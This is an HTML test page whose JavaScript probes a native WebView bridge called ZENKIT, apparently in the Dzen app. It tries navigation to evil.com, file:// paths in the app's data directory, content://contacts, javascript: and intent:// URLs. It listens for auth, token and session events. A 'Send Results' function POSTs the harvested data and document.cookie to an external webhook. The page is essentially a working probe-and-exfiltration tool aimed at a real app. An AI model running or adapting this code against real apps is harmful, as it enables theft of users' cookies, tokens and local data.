<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ZenKit Full Test</title>
    <style>
        body {
            font-family: monospace;
            padding: 10px;
            background: #0d1117;
            color: #c9d1d9;
            font-size: 12px;
        }
        #results {
            background: #161b22;
            padding: 10px;
            border-radius: 6px;
            white-space: pre-wrap;
            word-break: break-all;
            height: 70vh;
            overflow-y: auto;
            border: 1px solid #30363d;
        }
        .ok { color: #3fb950; }
        .err { color: #f85149; }
        .warn { color: #d29922; }
        .info { color: #58a6ff; }
        button {
            padding: 10px 15px;
            margin: 5px;
            background: #238636;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 12px;
        }
        .critical { background: #da3633; }
    </style>
</head>
<body>
    <button onclick="testAllMethods()">üîç Test ALL Methods</button>
    <button onclick="testNavigate()">üß≠ Test navigate()</button>
    <button onclick="testWithEvents()">üì° Test with Events</button>
    <button onclick="testOpenMethods()">üì± Test open*()</button>
    <button class="critical" onclick="sendToWebhook()">üì§ Send Results</button>
    <button onclick="clear()">Clear</button>
    
    <div id="results"></div>

    <script>
        var R = document.getElementById('results');
        var allResults = {};
        
        function log(m, t) {
            R.innerHTML += '<span class="'+(t||'')+'">' + m + '</span>\n';
            R.scrollTop = R.scrollHeight;
        }
        function clear() { R.innerHTML = ''; }
        
        async function testMethod(obj, name, method, params) {
            var key = name + '.' + method;
            try {
                var result;
                if (params !== undefined) {
                    result = obj[method](params);
                } else {
                    result = obj[method]();
                }
                
                // Handle promise
                if (result && typeof result.then === 'function') {
                    try {
                        var data = await result;
                        if (data && Object.keys(data).length > 0) {
                            log('‚úì ' + key + '(' + (params ? JSON.stringify(params) : '') + ') = ' + JSON.stringify(data), 'ok');
                            allResults[key] = data;
                            return data;
                        }
                    } catch(e) {
                        if (!e.message.includes('not found')) {
                            log('‚ö† ' + key + ' promise error: ' + e.message, 'warn');
                        }
                    }
                } else if (result && Object.keys(result).length > 0) {
                    log('‚úì ' + key + ' = ' + JSON.stringify(result), 'ok');
                    allResults[key] = result;
                    return result;
                }
            } catch(e) {
                if (!e.message.includes('not found')) {
                    log('‚úó ' + key + ': ' + e.message, 'err');
                }
            }
            return null;
        }
        
        async function testAllMethods() {
            clear();
            log('=== TESTING ALL ZENKIT METHODS ===\n', 'info');
            
            var methods = Object.keys(ZENKIT).filter(k => typeof ZENKIT[k] === 'function');
            
            for (var i = 0; i < methods.length; i++) {
                var m = methods[i];
                if (m === 'on' || m === 'off') continue;
                
                log('\n--- ' + m + '() ---', 'info');
                
                // Test without params
                await testMethod(ZENKIT, 'ZENKIT', m);
                
                // Test with empty object
                await testMethod(ZENKIT, 'ZENKIT', m, {});
                
                // Test with common params
                if (m.includes('article') || m.includes('Article')) {
                    await testMethod(ZENKIT, 'ZENKIT', m, {id: '123'});
                    await testMethod(ZENKIT, 'ZENKIT', m, {articleId: '123'});
                }
                if (m.includes('channel') || m.includes('Channel')) {
                    await testMethod(ZENKIT, 'ZENKIT', m, {channelId: '123'});
                }
                if (m.includes('navigate') || m.includes('open') || m.includes('url')) {
                    await testMethod(ZENKIT, 'ZENKIT', m, {url: 'https://dzen.ru'});
                    await testMethod(ZENKIT, 'ZENKIT', m, 'https://dzen.ru');
                }
            }
            
            log('\n\n=== SUMMARY ===', 'info');
            log('Methods with data: ' + Object.keys(allResults).length, 'ok');
            log(JSON.stringify(allResults, null, 2), 'ok');
        }
        
        async function testNavigate() {
            clear();
            log('=== NAVIGATE TESTS ===\n', 'info');
            
            var urls = [
                // Internal navigation
                {url: '/settings'},
                {url: '/profile'},
                {url: '/notifications'},
                {url: 'dzen://settings'},
                {url: 'dzen://profile'},
                
                // External
                {url: 'https://google.com'},
                {url: 'https://evil.com', external: true},
                {url: 'https://evil.com', inApp: false},
                
                // File access attempts
                {url: 'file:///sdcard/'},
                {url: 'file:///data/data/ru.zen.android/'},
                {url: 'content://contacts/people'},
                
                // Javascript
                {url: 'javascript:alert(1)'},
                
                // Intent
                {url: 'intent://evil.com#Intent;scheme=https;end'},
            ];
            
            for (var i = 0; i < urls.length; i++) {
                await testMethod(ZENKIT, 'ZENKIT', 'navigate', urls[i]);
                await new Promise(r => setTimeout(r, 300));
            }
            
            // Also test as string
            log('\n--- As string params ---', 'info');
            await testMethod(ZENKIT, 'ZENKIT', 'navigate', '/settings');
            await testMethod(ZENKIT, 'ZENKIT', 'navigate', 'https://evil.com');
        }
        
        async function testWithEvents() {
            clear();
            log('=== EVENT LISTENER TEST ===\n', 'info');
            
            // Subscribe to all possible events
            var events = [
                'ready', 'init', 'config', 'user', 'auth', 'token',
                'login', 'logout', 'session', 'navigation', 'navigate',
                'article', 'channel', 'subscription', 'storage', 'data',
                'error', 'message', 'response', 'callback', 'result',
                'photo', 'camera', 'share', 'settings', 'bell', 'notification'
            ];
            
            events.forEach(function(evt) {
                try {
                    ZENKIT.on(evt, function(data) {
                        log('üîî EVENT [' + evt + ']: ' + JSON.stringify(data), 'ok');
                        allResults['event_' + evt] = data;
                    });
                    log('Subscribed: ' + evt, 'info');
                } catch(e) {}
            });
            
            log('\n--- Now calling methods to trigger events ---\n', 'warn');
            
            // Trigger methods that might emit events
            await testMethod(ZENKIT, 'ZENKIT', 'onReady');
            await testMethod(ZENKIT, 'ZENKIT', 'articleInit');
            await testMethod(ZENKIT, 'ZENKIT', 'refreshConfig');
            
            log('\n‚è≥ Waiting 5 seconds for events...', 'warn');
            await new Promise(r => setTimeout(r, 5000));
            log('Done waiting.', 'info');
        }
        
        async function testOpenMethods() {
            clear();
            log('=== TESTING OPEN METHODS ===\n', 'info');
            
            // These might open native UI
            var openMethods = [
                ['openSettings', []],
                ['openBell', []],
                ['openComments', []],
                ['openComments', [{articleId: '123'}]],
                ['openNativeShareMenu', []],
                ['openNativeShareMenu', [{text: 'test', url: 'https://dzen.ru'}]],
                ['showCreatePublicationScreen', []],
                ['captureDocumentPhoto', []],
                ['share', [{text: 'test'}]],
                ['share', [{url: 'https://evil.com', text: 'Check this!'}]],
            ];
            
            for (var i = 0; i < openMethods.length; i++) {
                var m = openMethods[i][0];
                var p = openMethods[i][1];
                
                log('\nTrying ' + m + '(' + JSON.stringify(p) + ')...', 'info');
                
                try {
                    var result;
                    if (p.length === 0) {
                        result = ZENKIT[m]();
                    } else {
                        result = ZENKIT[m](p[0]);
                    }
                    
                    if (result && typeof result.then === 'function') {
                        result.then(function(data) {
                            log('‚úì ' + m + ' resolved: ' + JSON.stringify(data), 'ok');
                            allResults[m] = data;
                        }).catch(function(e) {
                            log('‚úó ' + m + ' rejected: ' + e, 'err');
                        });
                    } else {
                        log('Result: ' + JSON.stringify(result), 'ok');
                    }
                } catch(e) {
                    log('Error: ' + e.message, 'err');
                }
                
                // Wait a bit between calls
                await new Promise(r => setTimeout(r, 500));
            }
        }
        
        function sendToWebhook() {
            var data = {
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                url: window.location.href,
                results: allResults,
                zenkitMethods: Object.keys(ZENKIT),
                cookies: document.cookie
            };
            
            log('\nüì§ Sending...', 'warn');
            
            fetch('https://webhook.tuna.am/387WocKA8chxCpAjoA4S1rxg7cV', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(function() {
                log('‚úì Sent!', 'ok');
            }).catch(function(e) {
                log('Error: ' + e, 'err');
            });
        }
        
        // Auto-run
        window.onload = function() {
            log('Page loaded. ZENKIT available: ' + (typeof ZENKIT !== 'undefined'), 'info');
            log('Methods: ' + Object.keys(ZENKIT || {}).join(', '), 'info');
        };
    </script>
</body>
</html>
